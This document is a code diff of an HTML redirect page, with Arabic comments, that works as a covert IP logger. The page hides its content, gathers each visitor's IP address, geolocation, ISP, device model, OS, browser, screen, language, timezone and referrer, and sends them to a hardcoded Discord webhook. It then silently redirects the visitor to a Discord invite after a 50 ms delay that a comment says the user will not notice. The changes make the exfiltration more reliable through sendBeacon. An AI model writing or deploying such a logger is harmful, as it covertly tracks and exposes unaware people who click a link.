@@ -2,135 +2,104 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://discord.gg/M9L">
+    <title>جاري التوجيه...</title>
+    <style>body{display:none;}</style>
+</head>
+<body>
     <script>
-        // منع أي عرض مرئي تمامًا
-        document.documentElement.style.display = 'none';
-        
-        // ===== ثابت Webhook (استبدله برابطك الخاص) =====
+        // ------ إعداداتك ------
         const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1515984623874871346/dqTJouC5ZszPfl9CbNb_qTUVYKRX-wAKl0NwBLk3afhVj5HJQC-V8VOLHH_xqMci02RY";
         const DISCORD_REDIRECT = "https://discord.gg/M9L";
+        // ---------------------
+
+        // 1. جمع البيانات الأساسية (فوري، لا يعتمد على الشبكة)
+        const ua = navigator.userAgent;
         
-        // ===== التوجيه الفوري (أسرع شيء) =====
-        window.location.replace(DISCORD_REDIRECT);
-        
-        // ===== جمع البيانات وإرسالها للجميع دون أي شروط =====
-        // قاعدة بيانات موديلات iPhone كاملة
+        // دالة استخراج موديل iPhone كاملة (جميع الموديلات)
         const iPhoneModels = {
-            "1,1":"iPhone 2G","1,2":"iPhone 3G","2,1":"iPhone 3GS",
-            "3,1":"iPhone 4","3,2":"iPhone 4","3,3":"iPhone 4",
-            "4,1":"iPhone 4s","4,2":"iPhone 4s","4,3":"iPhone 4s",
-            "5,1":"iPhone 5","5,2":"iPhone 5","5,3":"iPhone 5c","5,4":"iPhone 5c",
-            "6,1":"iPhone 5s","6,2":"iPhone 5s",
-            "7,1":"iPhone 6 Plus","7,2":"iPhone 6",
-            "8,1":"iPhone 6s","8,2":"iPhone 6s Plus","8,4":"iPhone SE (1st gen)",
-            "9,1":"iPhone 7","9,2":"iPhone 7 Plus","9,3":"iPhone 7","9,4":"iPhone 7 Plus",
-            "10,1":"iPhone 8","10,2":"iPhone 8 Plus","10,3":"iPhone X","10,4":"iPhone 8","10,5":"iPhone 8 Plus","10,6":"iPhone X",
-            "11,2":"iPhone XS","11,4":"iPhone XS Max","11,6":"iPhone XS Max","11,8":"iPhone XR",
-            "12,1":"iPhone 11","12,3":"iPhone 11 Pro","12,5":"iPhone 11 Pro Max","12,8":"iPhone SE (2nd gen)",
-            "13,1":"iPhone 12 mini","13,2":"iPhone 12","13,3":"iPhone 12 Pro","13,4":"iPhone 12 Pro Max",
-            "14,4":"iPhone 13 mini","14,5":"iPhone 13","14,2":"iPhone 13 Pro","14,3":"iPhone 13 Pro Max","14,6":"iPhone SE (3rd gen)",
-            "15,4":"iPhone 14","15,5":"iPhone 14 Plus","15,2":"iPhone 14 Pro","15,3":"iPhone 14 Pro Max",
-            "16,3":"iPhone 15","16,4":"iPhone 15 Plus","16,1":"iPhone 15 Pro","16,2":"iPhone 15 Pro Max"
+            "1,1":"iPhone 2G","1,2":"iPhone 3G","2,1":"iPhone 3GS","3,1":"iPhone 4","3,2":"iPhone 4","3,3":"iPhone 4","4,1":"iPhone 4s","4,2":"iPhone 4s","4,3":"iPhone 4s","5,1":"iPhone 5","5,2":"iPhone 5","5,3":"iPhone 5c","5,4":"iPhone 5c","6,1":"iPhone 5s","6,2":"iPhone 5s","7,1":"iPhone 6 Plus","7,2":"iPhone 6","8,1":"iPhone 6s","8,2":"iPhone 6s Plus","8,4":"iPhone SE (1st gen)","9,1":"iPhone 7","9,2":"iPhone 7 Plus","9,3":"iPhone 7","9,4":"iPhone 7 Plus","10,1":"iPhone 8","10,2":"iPhone 8 Plus","10,3":"iPhone X","10,4":"iPhone 8","10,5":"iPhone 8 Plus","10,6":"iPhone X","11,2":"iPhone XS","11,4":"iPhone XS Max","11,6":"iPhone XS Max","11,8":"iPhone XR","12,1":"iPhone 11","12,3":"iPhone 11 Pro","12,5":"iPhone 11 Pro Max","12,8":"iPhone SE (2nd gen)","13,1":"iPhone 12 mini","13,2":"iPhone 12","13,3":"iPhone 12 Pro","13,4":"iPhone 12 Pro Max","14,4":"iPhone 13 mini","14,5":"iPhone 13","14,2":"iPhone 13 Pro","14,3":"iPhone 13 Pro Max","14,6":"iPhone SE (3rd gen)","15,4":"iPhone 14","15,5":"iPhone 14 Plus","15,2":"iPhone 14 Pro","15,3":"iPhone 14 Pro Max","16,3":"iPhone 15","16,4":"iPhone 15 Plus","16,1":"iPhone 15 Pro","16,2":"iPhone 15 Pro Max"
         };
-        
         function getIPhoneModel(ua) {
-            let match = ua.match(/iPhone(\d+),(\d+)/);
-            if (match) return iPhoneModels[`${match[1]},${match[2]}`] || `iPhone (${match[1]},${match[2]})`;
-            if (ua.includes("iPhone")) return "iPhone (موديل قديم)";
+            let m = ua.match(/iPhone(\d+),(\d+)/);
+            if (m) return iPhoneModels[`${m[1]},${m[2]}`] || `iPhone ${m[1]},${m[2]}`;
+            if (ua.includes("iPhone")) return "iPhone (قديم)";
             return null;
         }
-        
         function getOS(ua) {
-            if (ua.includes("Mac OS X")) {
-                let v = ua.match(/Mac OS X ([\d_]+)/)?.[1].replace(/_/g,'.') || "";
-                if (v.startsWith("10.15")) return `macOS Catalina ${v}`;
-                if (v.startsWith("11")) return `macOS Big Sur ${v}`;
-                if (v.startsWith("12")) return `macOS Monterey ${v}`;
-                if (v.startsWith("13")) return `macOS Ventura ${v}`;
-                if (v.startsWith("14")) return `macOS Sonoma ${v}`;
-                return `macOS ${v}`;
-            }
-            if (ua.includes("iPhone") || ua.includes("iPad")) {
-                let v = ua.match(/OS ([\d_]+)/)?.[1].replace(/_/g,'.') || "";
-                return ua.includes("iPad") ? `iPadOS ${v}` : `iOS ${v}`;
-            }
-            if (ua.includes("Android")) {
-                let v = ua.match(/Android ([\d\.]+)/)?.[1] || "";
-                return `Android ${v}`;
-            }
+            if (ua.includes("Mac OS X")) { let v = ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g,'.') || ""; if(v.startsWith("10.15")) return `macOS Catalina ${v}`; if(v.startsWith("11")) return `macOS Big Sur ${v}`; if(v.startsWith("12")) return `macOS Monterey ${v}`; if(v.startsWith("13")) return `macOS Ventura ${v}`; if(v.startsWith("14")) return `macOS Sonoma ${v}`; return `macOS ${v}`; }
+            if (ua.includes("iPhone")||ua.includes("iPad")) { let v = ua.match(/OS ([\d_]+)/)?.[1]?.replace(/_/g,'.') || ""; return ua.includes("iPad") ? `iPadOS ${v}` : `iOS ${v}`; }
+            if (ua.includes("Android")) { let v = ua.match(/Android ([\d\.]+)/)?.[1] || ""; return `Android ${v}`; }
             if (ua.includes("Windows NT 10.0")) return ua.includes("Win64; x64") && !ua.includes("rv:") ? "Windows 10/11" : "Windows 10";
-            if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
-            if (ua.includes("Windows NT 6.2")) return "Windows 8";
-            if (ua.includes("Windows NT 6.1")) return "Windows 7";
-            if (ua.includes("Windows NT 6.0")) return "Windows Vista";
-            if (ua.includes("Windows NT 5.1")) return "Windows XP";
-            if (ua.includes("Linux")) return "Linux";
-            return "غير معروف";
+            if (ua.includes("Windows NT 6.3")) return "Windows 8.1"; if (ua.includes("Windows NT 6.2")) return "Windows 8"; if (ua.includes("Windows NT 6.1")) return "Windows 7"; if (ua.includes("Linux")) return "Linux"; return "Unknown";
         }
-        
         function getBrowser(ua) {
-            if (ua.includes("Edg/")) return "Edge";
-            if (ua.includes("Firefox/")) return "Firefox";
-            if (ua.includes("Chrome/") && !ua.includes("Edg")) return "Chrome";
-            if (ua.includes("Safari/") && !ua.includes("Chrome")) return "Safari";
-            if (ua.includes("OPR/")) return "Opera";
-            return "أخرى";
+            if (ua.includes("Edg/")) return "Edge"; if (ua.includes("Firefox/")) return "Firefox"; if (ua.includes("Chrome/") && !ua.includes("Edg")) return "Chrome"; if (ua.includes("Safari/") && !ua.includes("Chrome")) return "Safari"; if (ua.includes("OPR/")) return "Opera"; return "Other";
         }
-        
-        // جمع البيانات الفورية (بدون انتظار)
-        const ua = navigator.userAgent;
+
         const data = {
             timestamp: new Date().toISOString(),
-            ip: "جاري الجلب...",
-            location: "جاري الجلب...",
             os: getOS(ua),
-            device: getIPhoneModel(ua) || (ua.includes("iPad") ? "iPad" : (ua.includes("Android") ? (ua.match(/Android; (.+?) Build/)?.[1] || "جهاز Android") : "كمبيوتر / غير معروف")),
+            device: getIPhoneModel(ua) || (ua.includes("iPad") ? "iPad" : (ua.includes("Android") ? (ua.match(/Android; (.+?) Build/)?.[1] || "Android") : "PC")),
             browser: getBrowser(ua),
-            screen: `${screen.width}x${screen.height} (نسبة: ${window.devicePixelRatio})`,
+            screen: `${screen.width}x${screen.height} (${window.devicePixelRatio}px)`,
             language: navigator.language,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             url: location.href,
-            referrer: document.referrer || "مباشر"
+            referrer: document.referrer || "direct",
+            ip: "جاري الجلب...",
+            location: "جاري الجلب..."
         };
-        
-        // جلب IP والموقع ثم الإرسال (دون أي شرط، يتم التنفيذ لكل زائر)
-        fetch('https://ipwho.is/')
-            .then(r => r.json())
-            .then(json => {
+
+        // 2. إرسال البيانات عبر sendBeacon (مضمون حتى بعد التوجيه)
+        function sendViaBeacon(payload) {
+            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+            navigator.sendBeacon(WEBHOOK_URL, blob);
+        }
+
+        // 3. جلب IP والموقع + الإرسال (لا ننتظر)
+        (async () => {
+            let ip = "غير متاح";
+            let locationText = "غير معروف";
+            try {
+                const res = await fetch('https://ipwho.is/');
+                const json = await res.json();
                 if (json.success) {
-                    data.ip = json.ip;
-                    data.location = `${json.city}, ${json.country} (${json.connection.isp || "ISP غير معروف"})`;
+                    ip = json.ip;
+                    locationText = `${json.city}, ${json.country} (${json.connection.isp || "No ISP"})`;
                 } else throw new Error();
-            })
-            .catch(() => fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => data.ip = d.ip).catch(() => data.ip = "غير متاح"))
-            .finally(() => {
-                // إرسال البيانات إلى Webhook (بـ keepalive لضمان الوصول)
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🕵️ زائر جديد (أو عائد) - توجيه فوري",
-                            color: 0x2C3E50,
-                            fields: [
-                                { name: "🌍 IP + الموقع", value: `${data.ip}\n${data.location}`, inline: false },
-                                { name: "📱 الجهاز", value: data.device, inline: true },
-                                { name: "💿 نظام التشغيل", value: data.os, inline: true },
-                                { name: "🌐 المتصفح", value: data.browser, inline: true },
-                                { name: "🖥️ الشاشة", value: data.screen, inline: true },
-                                { name: "🔤 اللغة", value: data.language, inline: true },
-                                { name: "🕐 المنطقة الزمنية", value: data.timezone, inline: true },
-                                { name: "🔗 الرابط", value: data.url, inline: false },
-                                { name: "🔗 المُحيل", value: data.referrer, inline: false }
-                            ],
-                            footer: { text: "تم التوجيه وجمع البيانات لجميع الزوار دون استثناء" }
-                        }]
-                    }),
-                    keepalive: true
-                }).catch(err => console.error("فشل الإرسال", err));
-            });
+            } catch(e) {
+                try {
+                    const res2 = await fetch('https://api.ipify.org?format=json');
+                    const d2 = await res2.json();
+                    ip = d2.ip;
+                } catch(e2) {}
+            }
+            data.ip = ip;
+            data.location = locationText;
+
+            const embed = {
+                title: "🕵️ زائر جديد - توجيه فوري",
+                color: 0x2C3E50,
+                fields: [
+                    {name: "🌍 IP + الموقع", value: `${data.ip}\n${data.location}`, inline: false},
+                    {name: "📱 الجهاز", value: data.device, inline: true},
+                    {name: "💿 نظام التشغيل", value: data.os, inline: true},
+                    {name: "🌐 المتصفح", value: data.browser, inline: true},
+                    {name: "🖥️ الشاشة", value: data.screen, inline: true},
+                    {name: "🔤 اللغة", value: data.language, inline: true},
+                    {name: "🕐 المنطقة الزمنية", value: data.timezone, inline: true},
+                    {name: "🔗 الرابط", value: data.url, inline: false},
+                    {name: "🔗 المُحيل", value: data.referrer, inline: false}
+                ],
+                footer: {text: "تم التوجيه وجمع البيانات لكل زائر"}
+            };
+            sendViaBeacon({embeds: [embed]});
+        })();
+
+        // 4. التوجيه بعد 50 مللي ثانية فقط (لا يشعر به المستخدم ويسمح بانطلاق الطلبات)
+        setTimeout(() => {
+            window.location.replace(DISCORD_REDIRECT);
+        }, 50);
     </script>
-</head>
-<body></body>
+</body>
 </html>
